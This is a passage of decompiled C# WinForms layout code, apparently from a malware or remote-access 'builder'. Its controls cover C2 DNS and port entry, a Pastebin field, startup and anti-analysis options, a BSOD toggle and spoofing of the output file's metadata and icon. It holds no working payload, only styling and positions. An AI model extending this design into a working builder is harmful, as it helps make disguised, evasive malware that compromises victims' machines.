			this.txtPaste_bin.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtPaste_bin.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtPaste_bin.FocusedState.Parent = this.txtPaste_bin;
			this.txtPaste_bin.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtPaste_bin.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtPaste_bin.HoverState.Parent = this.txtPaste_bin;
			this.txtPaste_bin.Location = new global::System.Drawing.Point(514, 262);
			this.txtPaste_bin.Name = "txtPaste_bin";
			this.txtPaste_bin.PasswordChar = '\0';
			this.txtPaste_bin.PlaceholderText = "";
			this.txtPaste_bin.SelectedText = "";
			this.txtPaste_bin.SelectionStart = 7;
			this.txtPaste_bin.ShadowDecoration.Parent = this.txtPaste_bin;
			this.txtPaste_bin.Size = new global::System.Drawing.Size(227, 26);
			this.txtPaste_bin.TabIndex = 126;
			this.textPort.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.textPort.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.textPort.DefaultText = "";
			this.textPort.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.textPort.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.textPort.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textPort.DisabledState.Parent = this.textPort;
			this.textPort.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textPort.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.textPort.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.textPort.FocusedState.Parent = this.textPort;
			this.textPort.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.textPort.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.textPort.HoverState.Parent = this.textPort;
			this.textPort.Location = new global::System.Drawing.Point(514, 101);
			this.textPort.Name = "textPort";
			this.textPort.PasswordChar = '\0';
			this.textPort.PlaceholderText = "";
			this.textPort.SelectedText = "";
			this.textPort.ShadowDecoration.Parent = this.textPort;
			this.textPort.Size = new global::System.Drawing.Size(227, 26);
			this.textPort.TabIndex = 126;
			this.btnRemoveIP.Animated = true;
			this.btnRemoveIP.BorderColor = global::System.Drawing.Color.Maroon;
			this.btnRemoveIP.BorderRadius = 5;
			this.btnRemoveIP.CheckedState.Parent = this.btnRemoveIP;
			this.btnRemoveIP.CustomImages.Parent = this.btnRemoveIP;
			this.btnRemoveIP.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.btnRemoveIP.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.btnRemoveIP.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.btnRemoveIP.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.btnRemoveIP.DisabledState.Parent = this.btnRemoveIP;
			this.btnRemoveIP.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnRemoveIP.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.btnRemoveIP.ForeColor = global::System.Drawing.Color.White;
			this.btnRemoveIP.HoverState.Parent = this.btnRemoveIP;
			this.btnRemoveIP.Location = new global::System.Drawing.Point(270, 182);
			this.btnRemoveIP.Name = "btnRemoveIP";
			this.btnRemoveIP.ShadowDecoration.Parent = this.btnRemoveIP;
			this.btnRemoveIP.Size = new global::System.Drawing.Size(101, 28);
			this.btnRemoveIP.TabIndex = 125;
			this.btnRemoveIP.Text = "Remove DNS";
			this.btnRemoveIP.Click += new global::System.EventHandler(this.BtnRemoveIP_Click);
			this.btnRemovePort.Animated = true;
			this.btnRemovePort.BorderColor = global::System.Drawing.Color.Maroon;
			this.btnRemovePort.BorderRadius = 5;
			this.btnRemovePort.CheckedState.Parent = this.btnRemovePort;
			this.btnRemovePort.CustomImages.Parent = this.btnRemovePort;
			this.btnRemovePort.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.btnRemovePort.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.btnRemovePort.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.btnRemovePort.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.btnRemovePort.DisabledState.Parent = this.btnRemovePort;
			this.btnRemovePort.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnRemovePort.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.btnRemovePort.ForeColor = global::System.Drawing.Color.White;
			this.btnRemovePort.HoverState.Parent = this.btnRemovePort;
			this.btnRemovePort.Location = new global::System.Drawing.Point(640, 182);
			this.btnRemovePort.Name = "btnRemovePort";
			this.btnRemovePort.ShadowDecoration.Parent = this.btnRemovePort;
			this.btnRemovePort.Size = new global::System.Drawing.Size(101, 28);
			this.btnRemovePort.TabIndex = 125;
			this.btnRemovePort.Text = "Remove Port";
			this.btnRemovePort.Click += new global::System.EventHandler(this.BtnRemovePort_Click);
			this.btnAddIP.Animated = true;
			this.btnAddIP.BorderColor = global::System.Drawing.Color.Maroon;
			this.btnAddIP.BorderRadius = 5;
			this.btnAddIP.CheckedState.Parent = this.btnAddIP;
			this.btnAddIP.CustomImages.Parent = this.btnAddIP;
			this.btnAddIP.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.btnAddIP.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.btnAddIP.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.btnAddIP.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.btnAddIP.DisabledState.Parent = this.btnAddIP;
			this.btnAddIP.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnAddIP.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.btnAddIP.ForeColor = global::System.Drawing.Color.White;
			this.btnAddIP.HoverState.Parent = this.btnAddIP;
			this.btnAddIP.Location = new global::System.Drawing.Point(144, 182);
			this.btnAddIP.Name = "btnAddIP";
			this.btnAddIP.ShadowDecoration.Parent = this.btnAddIP;
			this.btnAddIP.Size = new global::System.Drawing.Size(101, 28);
			this.btnAddIP.TabIndex = 125;
			this.btnAddIP.Text = "Add DNS";
			this.btnAddIP.Click += new global::System.EventHandler(this.BtnAddIP_Click);
			this.btnAddPort.Animated = true;
			this.btnAddPort.BorderColor = global::System.Drawing.Color.Maroon;
			this.btnAddPort.BorderRadius = 5;
			this.btnAddPort.CheckedState.Parent = this.btnAddPort;
			this.btnAddPort.CustomImages.Parent = this.btnAddPort;
			this.btnAddPort.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.btnAddPort.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.btnAddPort.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.btnAddPort.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.btnAddPort.DisabledState.Parent = this.btnAddPort;
			this.btnAddPort.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnAddPort.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.btnAddPort.ForeColor = global::System.Drawing.Color.White;
			this.btnAddPort.HoverState.Parent = this.btnAddPort;
			this.btnAddPort.Location = new global::System.Drawing.Point(514, 182);
			this.btnAddPort.Name = "btnAddPort";
			this.btnAddPort.ShadowDecoration.Parent = this.btnAddPort;
			this.btnAddPort.Size = new global::System.Drawing.Size(101, 28);
			this.btnAddPort.TabIndex = 125;
			this.btnAddPort.Text = "Add Port";
			this.btnAddPort.Click += new global::System.EventHandler(this.BtnAddPort_Click);
			this.tabPage2.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.tabPage2.Controls.Add(this.guna2ShadowPanel4);
			this.tabPage2.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage2.Name = "tabPage2";
			this.tabPage2.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage2.Size = new global::System.Drawing.Size(952, 483);
			this.tabPage2.TabIndex = 1;
			this.tabPage2.Text = "Startup";
			this.guna2ShadowPanel4.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ShadowPanel4.Controls.Add(this.textFilename);
			this.guna2ShadowPanel4.Controls.Add(this.chkAnti);
			this.guna2ShadowPanel4.Controls.Add(this.chkAntiProcess);
			this.guna2ShadowPanel4.Controls.Add(this.checkBox1);
			this.guna2ShadowPanel4.Controls.Add(this.label19);
			this.guna2ShadowPanel4.Controls.Add(this.label6);
			this.guna2ShadowPanel4.Controls.Add(this.numDelay);
			this.guna2ShadowPanel4.Controls.Add(this.comboBoxFolder);
			this.guna2ShadowPanel4.Controls.Add(this.label3);
			this.guna2ShadowPanel4.Controls.Add(this.label4);
			this.guna2ShadowPanel4.Controls.Add(this.label16);
			this.guna2ShadowPanel4.Controls.Add(this.label18);
			this.guna2ShadowPanel4.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2ShadowPanel4.Location = new global::System.Drawing.Point(37, 32);
			this.guna2ShadowPanel4.Name = "guna2ShadowPanel4";
			this.guna2ShadowPanel4.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ShadowPanel4.ShadowDepth = 200;
			this.guna2ShadowPanel4.ShadowShift = 7;
			this.guna2ShadowPanel4.Size = new global::System.Drawing.Size(879, 418);
			this.guna2ShadowPanel4.TabIndex = 122;
			this.textFilename.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.textFilename.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.textFilename.DefaultText = "";
			this.textFilename.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.textFilename.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.textFilename.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textFilename.DisabledState.Parent = this.textFilename;
			this.textFilename.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textFilename.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.textFilename.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.textFilename.FocusedState.Parent = this.textFilename;
			this.textFilename.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.textFilename.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.textFilename.HoverState.Parent = this.textFilename;
			this.textFilename.Location = new global::System.Drawing.Point(407, 153);
			this.textFilename.Name = "textFilename";
			this.textFilename.PasswordChar = '\0';
			this.textFilename.PlaceholderText = "";
			this.textFilename.SelectedText = "";
			this.textFilename.ShadowDecoration.Parent = this.textFilename;
			this.textFilename.Size = new global::System.Drawing.Size(190, 26);
			this.textFilename.TabIndex = 129;
			this.chkAnti.CheckedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.chkAnti.CheckedState.BorderRadius = 2;
			this.chkAnti.CheckedState.BorderThickness = 0;
			this.chkAnti.CheckedState.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.chkAnti.CheckedState.Parent = this.chkAnti;
			this.chkAnti.Location = new global::System.Drawing.Point(223, 251);
			this.chkAnti.Name = "chkAnti";
			this.chkAnti.ShadowDecoration.Parent = this.chkAnti;
			this.chkAnti.Size = new global::System.Drawing.Size(24, 24);
			this.chkAnti.TabIndex = 128;
			this.chkAnti.Text = "guna2CustomCheckBox1";
			this.chkAnti.UncheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.chkAnti.UncheckedState.BorderRadius = 2;
			this.chkAnti.UncheckedState.BorderThickness = 0;
			this.chkAnti.UncheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.chkAnti.UncheckedState.Parent = this.chkAnti;
			this.chkAnti.Click += new global::System.EventHandler(this.checkBox1_CheckedChanged);
			this.chkAntiProcess.CheckedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.chkAntiProcess.CheckedState.BorderRadius = 2;
			this.chkAntiProcess.CheckedState.BorderThickness = 0;
			this.chkAntiProcess.CheckedState.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.chkAntiProcess.CheckedState.Parent = this.chkAntiProcess;
			this.chkAntiProcess.Location = new global::System.Drawing.Point(422, 251);
			this.chkAntiProcess.Name = "chkAntiProcess";
			this.chkAntiProcess.ShadowDecoration.Parent = this.chkAntiProcess;
			this.chkAntiProcess.Size = new global::System.Drawing.Size(24, 24);
			this.chkAntiProcess.TabIndex = 128;
			this.chkAntiProcess.Text = "guna2CustomCheckBox1";
			this.chkAntiProcess.UncheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.chkAntiProcess.UncheckedState.BorderRadius = 2;
			this.chkAntiProcess.UncheckedState.BorderThickness = 0;
			this.chkAntiProcess.UncheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.chkAntiProcess.UncheckedState.Parent = this.chkAntiProcess;
			this.chkAntiProcess.Click += new global::System.EventHandler(this.checkBox1_CheckedChanged);
			this.checkBox1.CheckedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.checkBox1.CheckedState.BorderRadius = 2;
			this.checkBox1.CheckedState.BorderThickness = 0;
			this.checkBox1.CheckedState.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.checkBox1.CheckedState.Parent = this.checkBox1;
			this.checkBox1.Location = new global::System.Drawing.Point(223, 113);
			this.checkBox1.Name = "checkBox1";
			this.checkBox1.ShadowDecoration.Parent = this.checkBox1;
			this.checkBox1.Size = new global::System.Drawing.Size(24, 24);
			this.checkBox1.TabIndex = 128;
			this.checkBox1.Text = "guna2CustomCheckBox1";
			this.checkBox1.UncheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.checkBox1.UncheckedState.BorderRadius = 2;
			this.checkBox1.UncheckedState.BorderThickness = 0;
			this.checkBox1.UncheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.checkBox1.UncheckedState.Parent = this.checkBox1;
			this.checkBox1.Click += new global::System.EventHandler(this.checkBox1_CheckedChanged);
			this.tabPage3.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.tabPage3.Controls.Add(this.guna2ShadowPanel3);
			this.tabPage3.Controls.Add(this.chkBsod);
			this.tabPage3.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage3.Name = "tabPage3";
			this.tabPage3.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage3.Size = new global::System.Drawing.Size(952, 483);
			this.tabPage3.TabIndex = 2;
			this.tabPage3.Text = "Assembly";
			this.guna2ShadowPanel3.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ShadowPanel3.Controls.Add(this.txtIcon);
			this.guna2ShadowPanel3.Controls.Add(this.txtProductVersion);
			this.guna2ShadowPanel3.Controls.Add(this.txtFileVersion);
			this.guna2ShadowPanel3.Controls.Add(this.txtTrademarks);
			this.guna2ShadowPanel3.Controls.Add(this.txtCompany);
			this.guna2ShadowPanel3.Controls.Add(this.txtDescription);
			this.guna2ShadowPanel3.Controls.Add(this.txtProduct);
			this.guna2ShadowPanel3.Controls.Add(this.txtCopyright);
			this.guna2ShadowPanel3.Controls.Add(this.txtOriginalFilename);
			this.guna2ShadowPanel3.Controls.Add(this.btnAssembly);
			this.guna2ShadowPanel3.Controls.Add(this.chkIcon);
			this.guna2ShadowPanel3.Controls.Add(this.btnClone);
			this.guna2ShadowPanel3.Controls.Add(this.btnIcon);
			this.guna2ShadowPanel3.Controls.Add(this.picIcon);
			this.guna2ShadowPanel3.Controls.Add(this.label8);
			this.guna2ShadowPanel3.Controls.Add(this.label7);
			this.guna2ShadowPanel3.Controls.Add(this.label9);
			this.guna2ShadowPanel3.Controls.Add(this.label10);
			this.guna2ShadowPanel3.Controls.Add(this.label11);
			this.guna2ShadowPanel3.Controls.Add(this.label12);
			this.guna2ShadowPanel3.Controls.Add(this.label13);
			this.guna2ShadowPanel3.Controls.Add(this.label15);
			this.guna2ShadowPanel3.Controls.Add(this.label14);
			this.guna2ShadowPanel3.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2ShadowPanel3.Location = new global::System.Drawing.Point(41, 37);
			this.guna2ShadowPanel3.Name = "guna2ShadowPanel3";
			this.guna2ShadowPanel3.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ShadowPanel3.ShadowDepth = 200;
			this.guna2ShadowPanel3.ShadowShift = 7;
			this.guna2ShadowPanel3.Size = new global::System.Drawing.Size(873, 418);
			this.guna2ShadowPanel3.TabIndex = 0;
			this.txtIcon.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtIcon.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtIcon.DefaultText = "";
			this.txtIcon.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtIcon.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtIcon.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtIcon.DisabledState.Parent = this.txtIcon;
			this.txtIcon.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtIcon.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtIcon.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtIcon.FocusedState.Parent = this.txtIcon;
			this.txtIcon.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtIcon.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtIcon.HoverState.Parent = this.txtIcon;
			this.txtIcon.Location = new global::System.Drawing.Point(550, 115);
			this.txtIcon.Name = "txtIcon";
			this.txtIcon.PasswordChar = '\0';
			this.txtIcon.PlaceholderText = "";
			this.txtIcon.SelectedText = "";
			this.txtIcon.ShadowDecoration.Parent = this.txtIcon;
			this.txtIcon.Size = new global::System.Drawing.Size(190, 26);
			this.txtIcon.TabIndex = 130;
			this.txtProductVersion.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtProductVersion.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtProductVersion.DefaultText = "";
			this.txtProductVersion.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtProductVersion.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtProductVersion.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtProductVersion.DisabledState.Parent = this.txtProductVersion;
			this.txtProductVersion.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtProductVersion.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtProductVersion.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtProductVersion.FocusedState.Parent = this.txtProductVersion;
			this.txtProductVersion.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtProductVersion.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtProductVersion.HoverState.Parent = this.txtProductVersion;
			this.txtProductVersion.Location = new global::System.Drawing.Point(262, 307);
			this.txtProductVersion.Name = "txtProductVersion";
			this.txtProductVersion.PasswordChar = '\0';
			this.txtProductVersion.PlaceholderText = "0.0.0.0";
			this.txtProductVersion.SelectedText = "";
			this.txtProductVersion.ShadowDecoration.Parent = this.txtProductVersion;
			this.txtProductVersion.Size = new global::System.Drawing.Size(190, 26);
			this.txtProductVersion.TabIndex = 130;
			this.txtFileVersion.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtFileVersion.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtFileVersion.DefaultText = "";
			this.txtFileVersion.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtFileVersion.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtFileVersion.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtFileVersion.DisabledState.Parent = this.txtFileVersion;
			this.txtFileVersion.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtFileVersion.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtFileVersion.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtFileVersion.FocusedState.Parent = this.txtFileVersion;
			this.txtFileVersion.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtFileVersion.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtFileVersion.HoverState.Parent = this.txtFileVersion;
			this.txtFileVersion.Location = new global::System.Drawing.Point(262, 339);
			this.txtFileVersion.Name = "txtFileVersion";
			this.txtFileVersion.PasswordChar = '\0';
			this.txtFileVersion.PlaceholderText = "0.0.0.0";
			this.txtFileVersion.SelectedText = "";
			this.txtFileVersion.ShadowDecoration.Parent = this.txtFileVersion;
			this.txtFileVersion.Size = new global::System.Drawing.Size(190, 26);
			this.txtFileVersion.TabIndex = 130;
			this.txtTrademarks.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtTrademarks.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtTrademarks.DefaultText = "";
			this.txtTrademarks.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtTrademarks.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtTrademarks.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtTrademarks.DisabledState.Parent = this.txtTrademarks;
			this.txtTrademarks.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtTrademarks.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtTrademarks.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtTrademarks.FocusedState.Parent = this.txtTrademarks;
			this.txtTrademarks.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtTrademarks.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtTrademarks.HoverState.Parent = this.txtTrademarks;
			this.txtTrademarks.Location = new global::System.Drawing.Point(262, 243);
			this.txtTrademarks.Name = "txtTrademarks";
			this.txtTrademarks.PasswordChar = '\0';
			this.txtTrademarks.PlaceholderText = "";
			this.txtTrademarks.SelectedText = "";
			this.txtTrademarks.ShadowDecoration.Parent = this.txtTrademarks;
			this.txtTrademarks.Size = new global::System.Drawing.Size(190, 26);
			this.txtTrademarks.TabIndex = 130;
			this.txtCompany.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtCompany.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtCompany.DefaultText = "";
			this.txtCompany.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtCompany.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtCompany.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtCompany.DisabledState.Parent = this.txtCompany;
			this.txtCompany.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtCompany.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtCompany.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtCompany.FocusedState.Parent = this.txtCompany;
			this.txtCompany.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtCompany.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtCompany.HoverState.Parent = this.txtCompany;
			this.txtCompany.Location = new global::System.Drawing.Point(262, 179);
			this.txtCompany.Name = "txtCompany";
			this.txtCompany.PasswordChar = '\0';
			this.txtCompany.PlaceholderText = "";
			this.txtCompany.SelectedText = "";
			this.txtCompany.ShadowDecoration.Parent = this.txtCompany;
			this.txtCompany.Size = new global::System.Drawing.Size(190, 26);
			this.txtCompany.TabIndex = 130;
			this.txtDescription.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtDescription.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtDescription.DefaultText = "";
			this.txtDescription.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtDescription.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtDescription.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtDescription.DisabledState.Parent = this.txtDescription;
			this.txtDescription.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtDescription.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtDescription.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtDescription.FocusedState.Parent = this.txtDescription;
			this.txtDescription.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtDescription.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtDescription.HoverState.Parent = this.txtDescription;
			this.txtDescription.Location = new global::System.Drawing.Point(262, 147);
			this.txtDescription.Name = "txtDescription";
			this.txtDescription.PasswordChar = '\0';
			this.txtDescription.PlaceholderText = "";
			this.txtDescription.SelectedText = "";
			this.txtDescription.ShadowDecoration.Parent = this.txtDescription;
			this.txtDescription.Size = new global::System.Drawing.Size(190, 26);
			this.txtDescription.TabIndex = 130;
			this.txtProduct.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtProduct.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtProduct.DefaultText = "";
			this.txtProduct.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtProduct.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtProduct.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtProduct.DisabledState.Parent = this.txtProduct;
			this.txtProduct.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtProduct.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtProduct.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtProduct.FocusedState.Parent = this.txtProduct;
			this.txtProduct.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtProduct.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtProduct.HoverState.Parent = this.txtProduct;
			this.txtProduct.Location = new global::System.Drawing.Point(262, 115);
			this.txtProduct.Name = "txtProduct";
			this.txtProduct.PasswordChar = '\0';
			this.txtProduct.PlaceholderText = "";
			this.txtProduct.SelectedText = "";
			this.txtProduct.ShadowDecoration.Parent = this.txtProduct;
			this.txtProduct.Size = new global::System.Drawing.Size(190, 26);
			this.txtProduct.TabIndex = 130;
			this.txtCopyright.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtCopyright.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtCopyright.DefaultText = "";
			this.txtCopyright.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtCopyright.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtCopyright.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtCopyright.DisabledState.Parent = this.txtCopyright;
			this.txtCopyright.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtCopyright.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtCopyright.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtCopyright.FocusedState.Parent = this.txtCopyright;
			this.txtCopyright.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtCopyright.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtCopyright.HoverState.Parent = this.txtCopyright;
			this.txtCopyright.Location = new global::System.Drawing.Point(262, 211);
			this.txtCopyright.Name = "txtCopyright";
			this.txtCopyright.PasswordChar = '\0';
			this.txtCopyright.PlaceholderText = "";
			this.txtCopyright.SelectedText = "";
			this.txtCopyright.ShadowDecoration.Parent = this.txtCopyright;
			this.txtCopyright.Size = new global::System.Drawing.Size(190, 26);
			this.txtCopyright.TabIndex = 130;
			this.txtOriginalFilename.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtOriginalFilename.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtOriginalFilename.DefaultText = "";
			this.txtOriginalFilename.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtOriginalFilename.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtOriginalFilename.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtOriginalFilename.DisabledState.Parent = this.txtOriginalFilename;
